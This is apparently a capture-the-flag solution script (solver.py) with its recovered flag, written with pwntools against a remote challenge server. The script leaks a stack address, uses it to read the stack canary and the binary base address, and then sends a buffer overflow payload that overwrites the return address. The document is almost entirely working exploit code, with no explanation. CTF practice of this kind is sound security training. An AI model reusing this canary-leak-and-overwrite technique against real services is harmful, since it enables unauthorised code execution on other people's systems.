
# solver.py

```py
from pwn import *

r = remote('pwn.bbctf.fluxus.co.in', 4002)

r.readline()
r.readline()
leak = int(r.readline().split()[-1], 16)
cookie_add = leak + 0x18
r.readline()

cookie_add = hex(int.from_bytes((cookie_add).to_bytes(8, 'little'), byteorder='big'))[2:]

r.sendline(cookie_add.encode())

r.recv().split()
cookie = r.recv().split()[0]

cookie = int.from_bytes((int(cookie, 16)).to_bytes(8,'big'), 'little')

print(f'Cookies: {hex(cookie)}')

base_add = leak + 0x28

base_add = hex(int.from_bytes((base_add).to_bytes(8, 'little'), byteorder='big'))[2:]

r.sendline(base_add.encode())

r.recv().split()
base = r.recv().split()[0]

base = int.from_bytes((int(base, 16)).to_bytes(8,'big'), 'little') - 0xa21

print(f'Base: {hex(base)}')

cookie = int.from_bytes((cookie).to_bytes(8, 'little'), byteorder='little')
base = int.from_bytes((base).to_bytes(8, 'little'), byteorder='little')


w = cookie_add.encode() + b'A' * 8 + p64(cookie) + p64(base+0x8f7) * 4 

r.sendline(w)

sleep(3)

print(r.recv().split()[7])
```

# FLAG

**`flag{che471n9_s7acK_0raC1E}`**

